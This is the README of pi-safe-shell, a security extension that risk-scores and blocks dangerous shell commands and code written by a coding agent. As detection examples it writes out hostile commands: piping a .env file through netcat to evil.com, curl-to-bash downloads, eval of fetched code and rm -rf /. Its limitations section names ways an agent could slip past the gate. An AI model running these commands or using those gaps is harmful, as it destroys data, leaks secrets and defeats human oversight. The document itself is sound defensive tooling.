# pi-safe-shell 🛡️

**Protect your production assets from dangerous bash commands — and dangerous code.**

A [Pi](https://github.com/earendil-works/pi-coding-agent) extension that gates shell commands and code execution with three layers of security analysis, inspired by the [bash-damage-from-within](https://github.com/disler/bash-damage-from-within) project.

> **Default:** 🔒 **Block** mode — now with interactive options to Allow Once or Switch to Ask Mode.
> 
> **v0.4.0+:** Three security layers: pattern matching → AST analysis → code content analysis.
> **v0.5.0:** Block mode interactive prompt with Switch to Ask Mode option.
> 
> **154 tests, 100% pass rate.****

**Repository:** [github.com/aslamplr/pi-safe-shell](https://github.com/aslamplr/pi-safe-shell)

**Version:** 0.5.0

---

## Installation

```bash
# Install via npm (recommended)
pi install npm:@aslamplr/pi-safe-shell

# Or run from source
pi -e ./path/to/pi-safe-shell/index.ts

# Or clone to auto-discovered location
git clone https://github.com/aslamplr/pi-safe-shell.git ~/.pi/agent/extensions/pi-safe-shell
```

The extension loads automatically in all Pi sessions.

---

## Three Security Layers

```
Shell Command  ───►  Pattern Matching  ───►  AST Analysis  ───►  Execute / Block
                          │                        │
Code Write     ───►  Code Content Analysis  ───►  Execute / Block
```

### Layer 1: Pattern Matching (v0.1.0)
Token-exact denylist/whitelist matching. Commands matched against denylist are always blocked. Commands matched against whitelist are always allowed.

### Layer 2: AST Analysis (v0.3.0+)
Uses **tree-sitter-bash** to parse shell commands into an AST and semantically analyze them:

- **12 intent types** — Info, Read, Write, Delete, Execute, Network, Privilege, CodeExecution, etc.
- **Path scope analysis** — System (`/etc`), home (`~`), project (`./`), temp (`/tmp`)
- **Context-aware flags** — `-r` is recursive-delete for `rm`, but recursive-search for `grep`
- **Pipeline patterns** — `curl|bash`, `wget|sh`, data exfiltration (`cat .env|curl`)
- **Command chaining** — `&&`, `||`, `;` with per-command analysis
- **Interpreter detection** — `python -c`, `node -e`, `sh -c`, `bash -c`, `eval`, `xargs`
- **Inline code parsing** — Recursively analyze code inside `-c/-e` flags
- **Command substitution** — Detect dangerous ops inside `$()` and backticks
- **Variable expansion** — Detect `$HOME`, `$PATH`, `$IFS` with destructive commands
- **Heredoc analysis** — Analyze `<<EOF` content for dangerous patterns
- **Obfuscation detection** — Base64 decode piped to shell, wget download-execute patterns

### Layer 3: Code Content Analysis (v0.4.0)
Analyzes code written via `write`/`edit` tools to prevent agents from bypassing shell analysis by writing dangerous code instead:

- **Node.js patterns** — `fs.rmSync`, `child_process.exec`, `eval`, `require('child_process')`, `https.request`
- **Python patterns** — `shutil.rmtree`, `os.system`, `exec`, `subprocess.run`, `requests.post`
- **Obfuscation detection** — Base64 decoding, hex escapes, `String.fromCharCode`, string concatenation
- **Call chain detection** — File read + network POST (exfiltration), shell + rm -rf
- **Path-aware scoring** — Project paths (`./build`) reduce severity; system paths (`/`) increase it

---

## Risk Scoring

Every command and code snippet gets a risk score from 0-100:

| Level | Score | Shell Behavior | Code Behavior |
|-------|-------|----------------|---------------|
| 🟢 **Safe** | ≤20 | Allow | Allow |
| 🟡 **Caution** | 21-50 | Allow + warn | Allow + warn |
| 🟠 **Danger** | 51-80 | Require confirmation (ask mode) | Require confirmation (ask mode) |
| 🔴 **Critical** | ≥81 | Auto-block (all modes except YOLO) | Auto-block (all modes except YOLO) |

> **Thresholds are configurable.** Use `/safe-shell threshold <type> <value>` to tune sensitivity.

---

## Five Modes

| Mode | Behavior | Use Case |
|------|----------|----------|
| **🔒 Block** (default) | All shell calls blocked. When UI is available, offers interactive options: Allow Once, Switch to Ask Mode and Allow, or Deny. | Maximum safety. |
| **❓ Ask** | Each shell call shows a selection prompt. | Selective override without mode-switching. |
| **🔓 Whitelist** | Only whitelisted commands pass through. Compound operators rejected. | Standard dev workflow. |
| **🚀 YOLO** | All commands allowed except denylist. No prompts. | Maximum freedom, minimal safety net. |

```
/safe-shell mode ask
/safe-shell mode whitelist
/safe-shell mode block
/safe-shell mode yolo
```

---

## New in v0.4.0

### Code-Based Bypass Prevention
Prevents agents from bypassing shell analysis by writing dangerous code instead:

```
Agent writes:  fs.rmSync("/", { recursive: true })
               → Blocked: "Critical code detected (score: 85)"
               → Override: Use safe_shell_approve tool

Agent writes:  import os; os.system("rm -rf /")
               → Blocked: "Critical code detected (score: 100)"
```

**40+ dangerous API patterns** detected across Node.js and Python.

### Configurable Risk Thresholds
Tune sensitivity per project or session:

```
/safe-shell threshold danger 60   # Lower danger threshold from 51 to 60
/safe-shell threshold critical 75 # Make blocking more aggressive
```

Thresholds are validated to maintain `caution < danger < critical`.

### Learning Mode
Frequently-allowed commands are auto-whitelisted:

```
/safe-shell learning on            # Enable
/safe-shell learning status        # Check status
```

After a command is allowed N times (default: 3), it's automatically added to session approvals.

### Audit Log
Every command and code analysis is logged to `.pi/safe-shell-audit.jsonl`:

```
/safe-shell audit status           # View summary: blocked/allowed/confirmed counts
/safe-shell audit off              # Disable logging
```

Audit entries include: timestamp, command, tool, score, level, risk factors, decision, mode.

### Debug Mode
See detailed AST analysis and scoring breakdown in block messages:

```
/safe-shell debug on               # Enable
```

Shows: executable, args, flags, paths, pipe/redirect status, inline code, intent, reasons, risk factors.

### Expanded Threat Detection
- **Command substitution** — `$(rm -rf /)`, `echo $(curl ...)`, backtick patterns
- **Variable expansion** — `$HOME`, `$PATH`, `$LD_PRELOAD`, `$IFS`
- **Heredoc analysis** — `cat <<EOF ... EOF` body content scanning
- **Eval patterns** — `eval "$(curl ...)"`, `eval 'rm -rf /'`
- **Netcat exfiltration** — `cat .env | nc evil.com 4444`
- **Pipeline to interpreter** — `curl ... | python3`, `curl ... | php`

### Contextual Block Messages
Block messages now show:

```
🔒 Dangerous Shell Command Detected (CRITICAL: 100/100)

Command: rm -rf /

Intent: Delete

Risk Factors:
  • Recursive Operation
  • System Path
  • Destructive Operation

Detection Reasons:
  • dangerous flag: -r
  • dangerous flag: -f
  • rm -rf targeting system root

Why This Is Dangerous:
  This command targets system directories which are critical for OS operation.
  Modifying or deleting these files could render the system unbootable.

Safer Alternatives:
  • Use project-relative paths (./build, ./dist) instead of absolute system paths
  • Add path validation to ensure target is within project directory

Override:
  Use the safe_shell_approve tool to allow this command for this session.
```

---

## Commands

| Command | Action |
|---------|--------|
| `/safe-shell` | Show current mode, thresholds, and config summary |
| `/safe-shell mode block\|ask\|whitelist\|yolo` | Switch operating mode |
| `/safe-shell allow <command> [--project]` | Approve a command |
| `/safe-shell deny <command> [--project]` | Remove approval |
| `/safe-shell threshold <type> <value>` | Set risk threshold (critical/danger/caution) |
| `/safe-shell learning on\|off\|status` | Toggle learning mode |
| `/safe-shell debug on\|off\|status` | Toggle debug mode |
| `/safe-shell audit status\|on\|off` | View or toggle audit log |

---

## Gate Coverage

The shell gate intercepts **all** tools that can execute shell commands:

| Tool | How it's gated |
|------|---------------|
| **`bash`** | `command` parameter checked directly |
| **`ctx_execute`** with `language="shell"` | `code` parameter checked as shell command |
| **`ctx_execute`** JS/Python | Scanned for `child_process`/`subprocess`/`os.system` patterns |
| **`interactive_shell`** | `command` or `spawn.prompt` parameter checked |
| **`ctx_batch_execute`** | Each command in batch checked individually |
| **`write`/`edit`** | Code content analyzed for dangerous APIs |

---

## Approval Dialog (Ask Mode)

```
🐚 pi-safe-shell: allow this command?

  Tool: bash
  Command: rm -rf target/

→ Allow Once        Let this command run once
  Allow Always      Always allow in this session
  Allow for Project  Persist to project whitelist
  Deny              Block this command
```

---

## Agent Tools

### `safe_shell_mode`
Query-only tool. Checks current mode and approval count. No user interaction.

### `safe_shell_approve`
List, add, or remove session approvals. Shows user confirmation dialog:

```
safe_shell_approve({ action: "allow", command: "rm -rf ./build" })
  → User sees: Allow Once / Allow Always / Allow for Project / Deny
  → If approved: command added to session approvals
```

---

## Safe Registered Tools

| Tool | What it does | Why it's safe |
|------|-------------|---------------|
| **`run_tests`** | Runs configured test command | Output capped at 4KB |
| **`git_status`** | Shows `git status --porcelain -b` | Read-only |
| **`list_files`** | Lists filenames in a directory | Names only, no contents |

---

## Configuration

Three layers, highest priority first:

### Session State
Commands approved via `/safe-shell allow` or ask-mode dialog. Survive `/resume`.

### Project Config (`.pi/pi-safe-shell.json`)

```json
{
  "mode": "whitelist",
  "whitelist": ["^pnpm run build$", "^pnpm test$"],
  "denylist": ["rm -rf"],
  "criticalThreshold": 81,
  "dangerThreshold": 51,
  "cautionThreshold": 21,
  "learningMode": false,
  "learningMinUses": 3,
  "auditLogEnabled": true,
  "debugMode": false,
  "safeProjectPaths": ["./build", "./dist", "./out", "./target"],
  "testCommand": "pnpm",
  "testCommandArgs": ["test"],
  "testTimeout": 60000
}
```

### Global Config (`~/.pi/agent/extensions/pi-safe-shell/config.json`)
Auto-created on first run. Defaults for all projects.

### Precedence
```
Session approvals (highest)
  ↓
Project config (.pi/pi-safe-shell.json)
  ↓
Global config (~/.pi/agent/extensions/pi-safe-shell/config.json)
  ↓
Hardcoded defaults
```

---

## Test Results (v0.4.1)

```
AST Analyzer:  119/119 (100%)  — Commands, chains, substitutions, variables, heredocs
Code Analyzer:  35/35  (100%)  — APIs, obfuscation, paths, call chains
Total:         154/154 (100%)
```

---

## Architecture

```
Shell command → Denylist check → Temp approvals → AST analysis → Mode switch
                    │                │                │              │
                    ▼                ▼                ▼              ▼
                BLOCK ⛔         ALLOW ✅      Score 0-100     block/ask/whitelist/yolo

Code write    → Code content analysis → Block critical → Confirm danger → Allow safe
```

---

## File Structure

```
pi-safe-shell/
├── index.ts              # Main extension (1600+ lines)
├── src/
│   ├── ast-analyzer.ts   # AST-based shell command analysis
│   └── code-analyzer.ts  # Code content analysis (Node.js/Python)
├── test-ast-analyzer.ts  # 119 AST analysis tests
├── test-code-analyzer.ts # 35 code analysis tests
├── memory/core/project/  # Cross-session project knowledge
│   ├── 001-overview.md
│   ├── 002-v0.4.0-plan.md
│   ├── 003-architecture.md
│   └── 004-quickref.md
├── .pi/                  # Project config and audit log
├── package.json
└── README.md
```

---

## Development

```bash
git clone https://github.com/aslamplr/pi-safe-shell.git
cd pi-safe-shell
npm install
pi -e ./index.ts

# Run tests
npx tsx test-ast-analyzer.ts
npx tsx test-code-analyzer.ts
```

---

## Changelog

### v0.5.0 (2026-05-15)

**Block mode interactive prompt** 🎯

- ✅ Block mode now shows an interactive prompt when UI is available:
  - **Allow Once** — allows the command for this session
  - **Switch to Ask Mode and Allow** — switches to ask mode and allows
  - **Deny** — blocks the command
- ✅ Falls back to static block message in headless sessions

### v0.4.0 (2026-05-15)

**Code-Based Bypass Prevention + 6 Weeks of Features** 🚀

- ✅ **Code content analysis** — 40+ dangerous API patterns (Node.js + Python)
- ✅ **Configurable risk thresholds** — `/safe-shell threshold <type> <value>`
- ✅ **Learning mode** — Auto-whitelist frequent commands
- ✅ **Audit log** — All commands logged to `.pi/safe-shell-audit.jsonl`
- ✅ **Debug mode** — AST details in block messages
- ✅ **Command substitution detection** — `$()`, backticks
- ✅ **Variable expansion analysis** — `$HOME`, `$PATH`, `$LD_PRELOAD`, `$IFS`
- ✅ **Heredoc analysis** — `<<EOF` body scanning
- ✅ **Eval pattern extraction** — `eval "$(curl...)"`
- ✅ **Netcat exfiltration** — `cat .env \| nc`
- ✅ **Contextual block messages** — Risk factors, explanations, alternatives
- ✅ **100% pass rate** — 154 tests (119 AST + 35 code)

### v0.3.1 (2026-05-14)

**Critical NPM Package Fix** 🐛

- ✅ Include `src/` directory in npm package
- ✅ Move `tree-sitter-bash` and `web-tree-sitter` to dependencies

### v0.3.0 (2026-05-14)

**Phase 3: AST-Based Blocking** 🎉

- ✅ Auto-block CRITICAL risks, require confirmation for DANGER
- ✅ Inline code parsing, command chaining, interpreter bypass detection
- ✅ 12 intent types, path scope analysis, 25+ risk factors

### v0.2.0 (2026-05-13)

**YOLO Mode + CI/CD**

- ✅ YOLO mode — allow everything except denylist
- ✅ GitHub Actions CI/CD workflows

### v0.1.0 (2026-05-12)

**Initial Release**

- ✅ Four security modes, pattern matching, session approvals

---

## ⚠️ Limitations & Warnings

**This extension is not bulletproof.** It's one layer of defense, not your only security measure.

### Known Limitations

1. **eval inline code extraction** — `eval "rm -rf /"` is detected at CodeExecution (score 55) but the inline code isn't recursively analyzed. Scores are slightly lower than ideal for eval-only attacks.

2. **Obfuscation gaps** — String concatenation (`"rm" + " -rf" + " /"`) and hex escape sequences via variables aren't fully resolved. The dangerous API call itself (`eval`, `execSync`) is detected but the full severity may be underestimated.

3. **pathlib not detected** — Python's `pathlib.Path.unlink()` isn't in the current API detection patterns.

4. **Pure code execution** — Agents could write code using techniques not covered by patterns (FFI, native bindings, dynamic imports).

5. **Unmonitored tools** — New MCP servers or custom extensions aren't automatically gated.

6. **External processes** — Node.js worker threads, Python multiprocessing could bypass the shell gate.

**Use as one layer of defense.** Always review agent-generated code.

---

## ⚖️ No Warranty

**THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.** The authors make no representations that this extension will prevent all attacks. You are responsible for configuring appropriate policies, monitoring agent behavior, and maintaining backups.

---

## Credits

Inspired by [bash-damage-from-within](https://github.com/disler/bash-damage-from-within) by [IndyDevDan](https://www.youtube.com/@indydevdan).

---

## License

MIT
